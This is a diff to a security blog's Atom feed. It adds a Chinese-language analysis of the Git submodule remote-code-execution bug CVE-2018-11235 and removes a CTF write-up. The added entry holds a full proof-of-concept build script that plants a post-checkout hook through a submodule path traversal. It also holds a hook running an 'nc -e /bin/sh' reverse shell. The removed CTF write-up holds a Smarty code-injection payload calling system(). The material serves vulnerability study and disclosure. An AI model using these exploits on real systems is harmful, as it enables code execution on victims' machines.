@@ -229,6 +229,107 @@
   </entry>
   
   <entry>
+    <title>RCE with Git submodule分析-【CVE-2018-11235】</title>
+    <link href="http://chybeta.github.io/2018/05/31/RCE-with-Git-submodule%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-11235%E3%80%91/"/>
+    <id>http://chybeta.github.io/2018/05/31/RCE-with-Git-submodule分析-【CVE-2018-11235】/</id>
+    <published>2018-05-31T08:25:02.000Z</published>
+    <updated>2018-06-09T04:29:53.226Z</updated>
+    
+    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/2371" target="_blank" rel="external">RCE with Git submodule 分析-【CVE-2018-11235】</a><br><a id="more"></a></p>
+<h1 id="漏洞公告"><a href="#漏洞公告" class="headerlink" title="漏洞公告"></a>漏洞公告</h1><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11235" target="_blank" rel="external">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11235</a></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140935-dac66d0a-67bd-1.png" alt="1.png"></p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>Github上已经放出了<a href="https://github.com/Rogdham/CVE-2018-11235" target="_blank" rel="external">Rogdham/CVE-2018-11235</a>，原POC还需要git clone Spoon-Knife，对此我做了一些小修改。可以见<a href="https://github.com/CHYbeta/CVE-2018-11235-DEMO" target="_blank" rel="external">CVE-2018-11235-DEMO</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/CHYbeta/CVE-2018-11235-DEMO.git</div><div class="line">./build.sh</div></pre></td></tr></table></figure>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140935-dae0b0f2-67bd-1.gif" alt="demo.gif"></p>
+<p>个人本地测试Git版本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu  ~/CVE-2018-11235  git --version</div><div class="line">git version 2.17.0</div></pre></td></tr></table></figure></p>
+<p>其中 build.sh　主要内容如下：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line"></div><div class="line"><span class="built_in">set</span> <span class="_">-e</span></div><div class="line"></div><div class="line">repo_sub=<span class="string">"repo_sub"</span></div><div class="line">git init <span class="string">"<span class="variable">$repo_sub</span>"</span></div><div class="line"><span class="built_in">cd</span> <span class="string">"<span class="variable">$repo_sub</span>"</span></div><div class="line">touch chybeta</div><div class="line">git add chybeta</div><div class="line">git commit -m <span class="string">"test"</span></div><div class="line"><span class="built_in">cd</span> ..</div><div class="line"></div><div class="line">repo_par=<span class="string">"<span class="variable">$PWD</span>/repo_par"</span></div><div class="line">git init <span class="string">"<span class="variable">$repo_par</span>"</span></div><div class="line"><span class="built_in">cd</span> <span class="string">"<span class="variable">$repo_par</span>"</span></div><div class="line"></div><div class="line">repo_submodule=<span class="string">'./../repo_sub'</span></div><div class="line">git submodule add <span class="string">"<span class="variable">$repo_submodule</span>"</span> vuln</div><div class="line"></div><div class="line">mkdir modules</div><div class="line">cp -r .git/modules/vuln modules</div><div class="line">cp ../vuln.sh modules/vuln/hooks/post-checkout</div><div class="line">git add modules</div><div class="line"></div><div class="line">git config <span class="_">-f</span> .gitmodules --rename-section submodule.vuln submodule.../../modules/vuln</div><div class="line"></div><div class="line">git submodule add <span class="string">"<span class="variable">$repo_submodule</span>"</span></div><div class="line"></div><div class="line">git commit -m <span class="string">"CVE-2018-11235"</span></div><div class="line"></div><div class="line"><span class="built_in">echo</span> <span class="string">"git clone --recurse-submodules \"<span class="variable">$repo_par</span>\" dest_dir"</span></div></pre></td></tr></table></figure></p>
+<p>vuln.sh:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#!/bin/bash</div><div class="line">nc -e /bin/sh 127.0.0.1 12345</div></pre></td></tr></table></figure></p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>在Git中存在<a href="https://git-scm.com/book/zh/v1/%E8%87%AA%E5%AE%9A%E4%B9%89-Git-Git%E6%8C%82%E9%92%A9" target="_blank" rel="external">Git Hooks</a>的操作，它们被存放在一个repo的<code>.git</code>目录下的hooks文件目录下：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140935-daf553fe-67bd-1.png" alt="2.png"></p>
+<p>当配置了这些hooks后，其本质上是脚本文件，会被Git所调用。以<code>post-checkout</code>挂钩为例，如果在hooks中存在一个<code>post-checkout</code>脚本，则当在该repo中执行<code>git checkout</code>指令时，则会自动的去执行hooks目录下的<code>post-checkout</code>脚本。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140935-db0bfa6e-67bd-1.png" alt="3.png"></p>
+<p>正常情况下，这些hook脚本并不会在clone期间进行传送。也就是说这些脚本是由客户端自己定制的。否则的话，服务端直接在repo中插入hook文件则直接造成了RCE。如下测试，clone的repo3中的hook目录中是没有<code>post-checkout</code>脚本的:</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140935-db25903c-67bd-1.png" alt="4.png"></p>
+<p>而此次的RCE则是利用了Git的子模块功能，绕过了hook文件的限制。通过对子模块配置，将hook文件推送到了客户端中，从而造成RCE。</p>
+<p>先介绍一下submodules即子模块。在一些项目中，项目本身需要包含并使用另外一个项目，而这两个项目又是相互独立的。为了保持提交的独立等，可以在Git中使用子模块submodules来解决。</p>
+<p>以前面的build.sh中的内容为例：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">repo_sub=<span class="string">"repo_sub"</span></div><div class="line">git init <span class="string">"<span class="variable">$repo_sub</span>"</span></div><div class="line"><span class="built_in">cd</span> <span class="string">"<span class="variable">$repo_sub</span>"</span></div><div class="line">touch chybeta</div><div class="line">git add chybeta</div><div class="line">git commit -m <span class="string">"test"</span></div><div class="line"><span class="built_in">cd</span> ..</div></pre></td></tr></table></figure></p>
+<p>这里我们创建了一个仓库repo_sub，接着通过<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">repo_submodule=<span class="string">'./../repo_sub'</span></div><div class="line">git submodule add <span class="string">"<span class="variable">$repo_submodule</span>"</span> vuln</div></pre></td></tr></table></figure></p>
+<p>将repo_sub作为子模块添加到了仓库repo_par中，同时指定了路径<code>vuln</code>(即别名)。</p>
+<p>在<a href="https://git-scm.com/docs/gitsubmodules" target="_blank" rel="external">Git文档:gitsubmodules</a>中提到：</p>
+<blockquote>
+<blockquote>
+<p>On the filesystem, a submodule usually (but not always - see FORMS below) consists of (i) a Git directory located under the $GIT_DIR/modules/ directory of its superproject, (ii) a working directory inside the superproject’s working directory, and a .git file at the root of the submodule’s working directory pointing to (i).</p>
+</blockquote>
+</blockquote>
+<p>对于子模块而言，通常情况下，子模块的Git目录存放在<code>$GIT_DIR/modules/</code>中，而其工作目录即父项目的工作目录，同时在工作目录下还有一个<code>.git</code>文件来指向其Git目录。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140935-db3c1578-67bd-1.png" alt="7.png"></p>
+<p>当添加子模块完成后，在repo_par中会出现<code>.gitmodules</code>文件，该配置文件保存了项目 URL 与已经拉取的本地目录之间的映射。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140936-db4bf8d0-67bd-1.png" alt="5.png"></p>
+<p><code>.gitmodules</code>文件同样受到版本控制的影响，会一起进行推送。这样clone的用户才知道去哪里拉取具体的子模块内容。它的文件格式可以见<a href="https://git-scm.com/docs/gitmodules" target="_blank" rel="external">官方文档gitmodules</a>：</p>
+<p>这里对子模块<code>vuln</code>而言，它的<code>name</code>就是<code>vuln</code>,<code>path</code>就是<code>vuln</code>,url即为<code>./../repo_sub</code>。关于这个name，在官方文档中有这样一些表述：</p>
+<blockquote>
+<blockquote>
+<p>The file contains one subsection per submodule, and the subsection value is the name of the submodule. The name is set to the path where the submodule has been added unless it was customized with the —name option of git submodule add. Each submodule section also contains the following required keys….</p>
+</blockquote>
+</blockquote>
+<p>接下来以git version 2.17.0为例，根据Git源代码看看漏洞的触发点。当repo存在submodule时，会从<code>.gitmodules</code>文件中读取相关信息，并将信息保存到cache中以节省资源。在submodule-config.c第563行<code>gitmodules_cb</code>的最后将会调用<code>parse_config</code>对<code>.gitmodules</code>进行解析：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">gitmodules_cb</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *var, <span class="keyword">const</span> <span class="keyword">char</span> *value, <span class="keyword">void</span> *data)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">struct</span> repository *repo = data;</div><div class="line">	<span class="keyword">struct</span> parse_config_parameter parameter;</div><div class="line"></div><div class="line">	parameter.cache = repo-&gt;submodule_cache;</div><div class="line">	parameter.treeish_name = <span class="literal">NULL</span>;</div><div class="line">	parameter.gitmodules_sha1 = null_sha1;</div><div class="line">	parameter.overwrite = <span class="number">1</span>;</div><div class="line"></div><div class="line">	<span class="keyword">return</span> parse_config(var, value, &amp;parameter);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>submodule-config.c第362行：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">parse_config</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *var, <span class="keyword">const</span> <span class="keyword">char</span> *value, <span class="keyword">void</span> *data)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">struct</span> parse_config_parameter *me = data;</div><div class="line">	<span class="keyword">struct</span> submodule *submodule;</div><div class="line">	<span class="keyword">struct</span> strbuf name = STRBUF_INIT, item = STRBUF_INIT;</div><div class="line">	<span class="keyword">int</span> ret = <span class="number">0</span>;</div><div class="line"></div><div class="line">	<span class="comment">/* this also ensures that we only parse submodule entries */</span></div><div class="line">	<span class="keyword">if</span> (!name_and_item_from_var(var, &amp;name, &amp;item))</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line"></div><div class="line">   	submodule = lookup_or_create_by_name(me-&gt;cache,</div><div class="line">					     me-&gt;gitmodules_sha1,</div><div class="line">					     name.buf);</div><div class="line">    ....</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p><code>name_and_item_from_var(var, &amp;name, &amp;item)</code>用于从变量<code>var</code>中获得name值，具体代码如下<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// submodule-config.c</span></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">name_and_item_from_var</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *var, <span class="keyword">struct</span> strbuf *name,</span></span></div><div class="line">				  <span class="keyword">struct</span> strbuf *item)</div><div class="line">&#123;</div><div class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *subsection, *key;</div><div class="line">	<span class="keyword">int</span> subsection_len, parse;</div><div class="line">	parse = parse_config_key(var, <span class="string">"submodule"</span>, &amp;subsection,</div><div class="line">			&amp;subsection_len, &amp;key);</div><div class="line">	<span class="keyword">if</span> (parse &lt; <span class="number">0</span> || !subsection)</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line"></div><div class="line">	strbuf_add(name, subsection, subsection_len);</div><div class="line">	strbuf_addstr(item, key);</div><div class="line"></div><div class="line">	<span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>假设<code>.gitmodules</code>中内容为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[submodule &quot;vuln&quot;]</div><div class="line">	path = vuln</div><div class="line">	url = ./../repo_sub</div></pre></td></tr></table></figure></p>
+<p>则通过parse_config_key解析出来的subsection会通过strbuf_add被添加到name中，即此时name的值为<code>vuln</code></p>
+<p>回到<code>parse_config</code>中，此后将通过<code>lookup_or_create_by_name(me-&gt;cache,me-&gt;gitmodules_sha1,name.buf)</code>获取子模块的信息并进行一系列操作。</p>
+<p>在 <code>submodule.c</code>第1617行，代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">submodule_move_head</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path,</span></span></div><div class="line">			 <span class="keyword">const</span> <span class="keyword">char</span> *old_head,</div><div class="line">			 <span class="keyword">const</span> <span class="keyword">char</span> *new_head,</div><div class="line">			 <span class="keyword">unsigned</span> flags)</div><div class="line">&#123;</div><div class="line">	...</div><div class="line">	<span class="comment">// 第 1617 行</span></div><div class="line">	<span class="keyword">if</span> (!(flags &amp; SUBMODULE_MOVE_HEAD_DRY_RUN)) &#123;</div><div class="line">		<span class="keyword">if</span> (old_head) &#123;</div><div class="line">			<span class="keyword">if</span> (!submodule_uses_gitfile(path))</div><div class="line">				absorb_git_dir_into_superproject(<span class="string">""</span>, path,</div><div class="line">					ABSORB_GITDIR_RECURSE_SUBMODULES);</div><div class="line">		&#125; <span class="keyword">else</span> &#123;</div><div class="line">			<span class="keyword">char</span> *gitdir = xstrfmt(<span class="string">"%s/modules/%s"</span>,</div><div class="line">				    get_git_common_dir(), sub-&gt;name);</div><div class="line">			connect_work_tree_and_git_dir(path, gitdir);</div><div class="line">			<span class="built_in">free</span>(gitdir);</div><div class="line"></div><div class="line">			<span class="comment">/* make sure the index is clean as well */</span></div><div class="line">			submodule_reset_index(path);</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="keyword">if</span> (old_head &amp;&amp; (flags &amp; SUBMODULE_MOVE_HEAD_FORCE)) &#123;</div><div class="line">			<span class="keyword">char</span> *gitdir = xstrfmt(<span class="string">"%s/modules/%s"</span>,</div><div class="line">				    get_git_common_dir(), sub-&gt;name);</div><div class="line">			connect_work_tree_and_git_dir(path, gitdir);</div><div class="line">			<span class="built_in">free</span>(gitdir);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>这通过<code>xstrfmt(&quot;%s/modules/%s&quot;,get_git_common_dir(), sub-&gt;name)</code>来获得子模块的Git目录。在正常情况下，对于子模块 vuln 而言，<code>get_git_common_dir</code>即父repo的Git目录，即<code>.git</code>。<code>sub-&gt;name</code>即前面获得的name值。拼接完成后子模块的Git目录即为<code>.git/modules/vuln</code></p>
+<p>但从前面的代码看来，对于<code>name</code>和<code>sub-&gt;name</code>，Git并没有做相关的输入检查/路径检查。如果我们通过设置<code>name</code>为<code>../../vuln</code>，则拼接后的路径即<code>.git/modules/../../vuln</code>，即当前目录下的<code>vuln</code>目录。这里存在一个目录穿越漏洞，之后的解析将把当前目录下的<code>vuln</code>目录当做子模块的Git目录。</p>
+<p>前面说到，<code>.git/hooks</code>目录中的hook脚本并不会在clone期间进行传送。结合目录穿越漏洞，我们考虑这样的攻击方式:</p>
+<ol>
+<li>将目录<code>.git/modules/vuln</code>拷贝到当前目录<code>modules</code>下。</li>
+<li>往<code>modules/vuln</code>目录中的hooks目录添加hook脚本</li>
+<li>构造子模块，使其name成为<code>../../modules/vuln</code>，使子模块的Git目录信息指向当前目录下<code>module/vuln</code></li>
+<li>构造repo，使其在git clone时触发hook脚本</li>
+</ol>
+<p>先考虑前2条，即对应build.sh中下述代码<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mkdir modules</div><div class="line">cp -r .git/modules/vuln modules</div><div class="line">cp ../vuln.sh modules/vuln/hooks/post-checkout</div><div class="line">git add modules</div></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140936-db698576-67bd-1.png" alt="8.png"></p>
+<p>第三条：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git config -f .gitmodules --rename-section submodule.vuln submodule.../../modules/vuln</div></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140936-db7682ee-67bd-1.png" alt="9.png"></p>
+<p>第四点，为了让<code>.git/modules/../../modules/vuln</code>即<code>modules/vuln</code>下的hooks目录中的hook脚本被调用，执行下述语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git submodule add &quot;$repo_submodule&quot;</div><div class="line">git commit -m &quot;CVE-2018-11235&quot;</div></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140936-db854040-67bd-1.png" alt="10.png"></p>
+<p>再添加一个子模块。当Git地进行<code>git clone --recurse-submodules</code>时，会发现clone下来的目录中已经有了对应的子模块项目，因此实际上不需要clone，只要进行check out就行。而在check out时则会调用post-checkout脚本。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140936-dba256e4-67bd-1.png" alt="11.png"></p>
+<p>上述的分析针对 git version 2.17.0 进行。在一些低版本的Git中，由于功能等差异，可能上述环境会出错。Tony Torralba在其博客中复现了Git 2.7.4版本的漏洞，需要利用符号链接来进行RCE，具体的利用过程见 <a href="https://atorralba.github.io/CVE-2018-11235/" target="_blank" rel="external">CVE-2018-11235 - Quick &amp; Dirty PoC</a></p>
+<h1 id="补丁浅析"><a href="#补丁浅析" class="headerlink" title="补丁浅析"></a>补丁浅析</h1><p>补丁见：<a href="https://github.com/git/git/commit/0383bbb9015898cbc79abd7b64316484d7713b44" target="_blank" rel="external">https://github.com/git/git/commit/0383bbb9015898cbc79abd7b64316484d7713b44</a></p>
+<p>主要是对从<code>.gitmodules</code>中获取的name进行了检查</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140936-dbbd8cac-67bd-1.png" alt="12.png"></p>
+<p>在<code>name_and_item_from_var(var, &amp;name, &amp;item)</code>函数中调用了<code>check_submodule_name</code>来进行检查：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140936-dbd119f2-67bd-1.png" alt="13.png"></p>
+<p>Git在14年也爆过RCE洞(CVE-2014–9390)，其原理也是利用了目录穿越加覆盖配置文件，在checkout时进行RCE。具体可见参考链接。</p>
+<p>有些地方可能没解释清楚或有不当的地方，欢迎留言讨论。</p>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
+<li><a href="https://github.com/Rogdham/CVE-2018-11235" target="_blank" rel="external">Rogdham/CVE-2018-11235</a></li>
+<li><a href="https://blogs.msdn.microsoft.com/devops/2018/05/29/announcing-the-may-2018-git-security-vulnerability/" target="_blank" rel="external">Remediating the May 2018 Git Security Vulnerability</a></li>
+<li><a href="https://git-scm.com/book/zh/v2/Git-%E5%B7%A5%E5%85%B7-%E5%AD%90%E6%A8%A1%E5%9D%97" target="_blank" rel="external">Git 工具 - 子模块</a></li>
+<li><a href="https://blog.github.com/2014-12-18-vulnerability-announced-update-your-git-clients/" target="_blank" rel="external">CVE-2014–9390</a></li>
+<li><a href="https://atorralba.github.io/CVE-2018-11235/" target="_blank" rel="external">atorralba：CVE-2018-11235 - Quick &amp; Dirty PoC</a></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2371&quot;&gt;RCE with Git submodule 分析-【CVE-2018-11235】&lt;/a&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
+    
+    
+      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+      <category term="git" scheme="http://chybeta.github.io/tags/git/"/>
+    
+      <category term="submodule" scheme="http://chybeta.github.io/tags/submodule/"/>
+    
+  </entry>
+  
+  <entry>
     <title>Unsafe Unzip with spring-integration-zip 分析-【CVE-2018-1261 与 CVE-2018-1263】</title>
     <link href="http://chybeta.github.io/2018/05/14/Unsafe-Unzip-with-spring-integration-zip-%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-1261-%E4%B8%8E-CVE-2018-1263%E3%80%91/"/>
     <id>http://chybeta.github.io/2018/05/14/Unsafe-Unzip-with-spring-integration-zip-分析-【CVE-2018-1261-与-CVE-2018-1263】/</id>
@@ -869,9 +970,9 @@
     
       <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
-      <category term="漏洞分析" scheme="http://chybeta.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
-    
       <category term="getshell" scheme="http://chybeta.github.io/tags/getshell/"/>
+    
+      <category term="漏洞分析" scheme="http://chybeta.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
     
       <category term="代码执行" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
     
@@ -1272,9 +1373,9 @@
     
       <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
-      <category term="漏洞分析" scheme="http://chybeta.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
-    
       <category term="getshell" scheme="http://chybeta.github.io/tags/getshell/"/>
+    
+      <category term="漏洞分析" scheme="http://chybeta.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
     
       <category term="代码执行" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
     
@@ -1583,44 +1684,6 @@
       <category term="漏洞分析" scheme="http://chybeta.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
     
       <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Insomni&#39;hack teaser 2018-Smart-Y-writeup</title>
-    <link href="http://chybeta.github.io/2018/01/23/Insomni-hack-teaser-2018-Smart-Y-writeup/"/>
-    <id>http://chybeta.github.io/2018/01/23/Insomni-hack-teaser-2018-Smart-Y-writeup/</id>
-    <published>2018-01-23T12:23:33.000Z</published>
-    <updated>2018-01-23T12:33:22.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>Insomni’hack teaser 2018-Smart-Y-writeup</p>
-<p>CVE-2017-1000480-Smarty-3-1-32-php代码执行-漏洞<br><a id="more"></a></p>
-<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Last year, a nerd destroyed the system of Robot City by using some evident flaws. It seems that the system has changed <span class="keyword">and</span> is not <span class="keyword">as</span> evident to <span class="keyword">break</span> now.</div><div class="line"></div><div class="line">http:<span class="comment">//smart-y.teaser.insomnihack.ch</span></div></pre></td></tr></table></figure>
-<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>题目给了<a href="http://smart-y.teaser.insomnihack.ch/console.php?hl" target="_blank" rel="external">源码</a>:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'hl'</span>]))&#123; highlight_file(<span class="keyword">__FILE__</span>); <span class="keyword">exit</span>; &#125;</div><div class="line"><span class="keyword">include_once</span>(<span class="string">'./smarty/libs/Smarty.class.php'</span>);</div><div class="line">define(<span class="string">'SMARTY_COMPILE_DIR'</span>,<span class="string">'/tmp/templates_c'</span>);</div><div class="line">define(<span class="string">'SMARTY_CACHE_DIR'</span>,<span class="string">'/tmp/cache'</span>);</div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">news</span> <span class="keyword">extends</span> <span class="title">Smarty_Resource_Custom</span></span></div><div class="line">&#123;</div><div class="line">   <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">($name,&amp;$source,&amp;$mtime)</span></span></div><div class="line">   &#123;</div><div class="line">	   $template = <span class="string">"The news system is in maintenance. Please wait a year. &lt;a href='/console.php?hl'&gt;"</span>.htmlspecialchars(<span class="string">"&lt;&lt;&lt;DEBUG&gt;&gt;&gt;"</span>).<span class="string">"&lt;/a&gt;"</span>;</div><div class="line">	   $source = $template;</div><div class="line">	   $mtime = time();</div><div class="line">   &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// Smarty configuration</span></div><div class="line">$smarty = <span class="keyword">new</span> Smarty();</div><div class="line">$my_security_policy = <span class="keyword">new</span> Smarty_Security($smarty);</div><div class="line">$my_security_policy-&gt;php_functions = <span class="keyword">null</span>;</div><div class="line">$my_security_policy-&gt;php_handling = Smarty::PHP_REMOVE;</div><div class="line">$my_security_policy-&gt;modifiers = <span class="keyword">array</span>();</div><div class="line">$smarty-&gt;enableSecurity($my_security_policy);</div><div class="line">$smarty-&gt;setCacheDir(SMARTY_CACHE_DIR);</div><div class="line">$smarty-&gt;setCompileDir(SMARTY_COMPILE_DIR);</div><div class="line"></div><div class="line"></div><div class="line">$smarty-&gt;registerResource(<span class="string">'news'</span>,<span class="keyword">new</span> news);</div><div class="line">$smarty-&gt;display(<span class="string">'news:'</span>.(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]) ? $_GET[<span class="string">'id'</span>] : <span class="string">''</span>));</div></pre></td></tr></table></figure></p>
-<p>由源码的简洁性，推测是smarty框架的漏洞。通过扫目录可以发现存在smarty目录<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180123/11.jpg?raw=true" alt=""></p>
-<p>查看change-log，得出smarty版本为3.1.31<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180123/12.jpg?raw=true" alt=""></p>
-<p>利用<code>CVE-2017-1000480-Smarty-3-1-32-php代码执行-漏洞</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://smart-y.teaser.insomnihack.ch/console.php?id=*/system(&apos;ls /&apos;);//</div></pre></td></tr></table></figure></p>
